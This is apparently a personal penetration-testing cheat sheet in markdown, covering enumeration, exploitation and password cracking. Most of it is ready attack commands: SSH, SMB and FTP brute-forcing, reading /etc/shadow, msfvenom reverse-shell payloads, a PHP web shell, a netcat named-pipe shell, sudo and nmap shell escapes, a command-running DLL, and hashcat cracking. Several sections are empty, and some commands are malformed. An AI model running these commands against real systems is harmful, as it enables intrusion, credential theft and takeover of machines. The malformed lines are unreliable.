# Enumeration
## NMAP
```
SSH:
nmap -n -p22 --script ssh-brute \
```
```
HTTP:
nmap --script http-enum targetIP \
nmap -n -p 80 --script -http-grep \
```
```
SMB:
nmap -p 445 --script-os-discovery targetIP
nmap -sV -p 445 --script smb-brute targetIP
nmap -n -p139,445 --script=smb-enum-users --script-args=smbusername="",\
```
## Gobuster
```
gobuster dir --url {{https://example.com/}} --wordlist {{path/to/file}}
gobuster dns --domain {{example.com}} --wordlist {{path/to/file}}
```
## Ffuf
```
ffuf -w {{path/to/wordlist}} -u {{https://target/FUZZ}} -c -v
ffuf -w {{hosts.txt}} -u {{https://example.org}} -H "{{Host: FUZZ}}" -mc {{200}}
ffuf -w {{subdomains.txt}} -u {{https://website.com}} -H "{{Host: FUZZ.website.com}}"
```

## Searching files
```
`findstr /si password *.txt`
```

## Patch Level
```
`wmic qfe get Caption,Description,HotFixID,InstalledOn`
```

## Scheduled Tasks
```
`schtasks /query /fo LIST /v`
```

## Windows Services and Software
```
wmic service list brief| findstr "Running"
sc qc
wmic product get name,version,vendor
```

## Base64
```
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```
# Exploitation
## Metasploit
```
MSFVENOM:
msfvenom -l
msfvenom -p {{payload}} --list-options
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f elf > rev_shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > {{path/to/binary.exe}}
Staged vs Stageless:
windows/x64/meterpreter/reverse_tcp vs. windows/x86/meterpreter_reverse_tcp

```

```
Meterpreter commands:
upload
getuid
PS
migrate
getsystem
hashdump
shell
search
clearev
sysinfo
```
```
CMD commands:
dir
type
```

## Python
```

```

```

```
## netcat
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```
```

```

## Skeleton DLL Code
```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt"); # edit this line
        ExitProcess(0);
    }
    return TRUE;
}
```

## PHP
```
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
**ex**: /shell.php?cmd=
webshells dir: */usr/share/webshells*
```

## Creating Named Pipes
```
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
```

## SUDO
```
find . -exec /bin/bash \; -quit
```

## SUID
```
`find / -type f -perm -04000 -ls 2>/dev/null'
```

## NMAP
```
1. TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF

2. sudo nmap --interactive
 nmap> !sh
```

## Unquoted Service Path
```
sc qc unquotedsvc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > common.exe

Python3 -m http.server 4444

Get-service -Name unquotedsvc | Restart-Service
```

## AlwaysInstallElevated
```
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
```


# Password cracking

```
HASHCAT:
hashcat --hash-type {{hash_type_id}} --attack-mode {{3}} {{hash_value}}
hashcat --hash-type {{hash_type_id}} --attack-mode {{1}} {{hash_value}} {{/path/to/dictionary1.txt}} {{/path/to/dictionary2.txt}}
hashcat --hash-type {{hash_type_id}} --attack-mode {{0}} {{hash_value}} {{/usr/share/wordlists/rockyou.txt}}
hashcat --hash-type {{hash_type_id}} --attack-mode {{3}} --increment {{hash_value}} "{{?a?a?a?a?a?a?a?a}}"
hashcat --show {{hash_value}}
```
```
Hydra:
hydra -l {{username}} -P {{path/to/wordlist.txt}} {{host_ip}} {{ssh}}
hydra -L {{path/to/usernames.txt}} -P {{path/to/wordlist.txt}} -t {{n_tasks}} {{host_ip}} {{ftp}}

```

## Extras





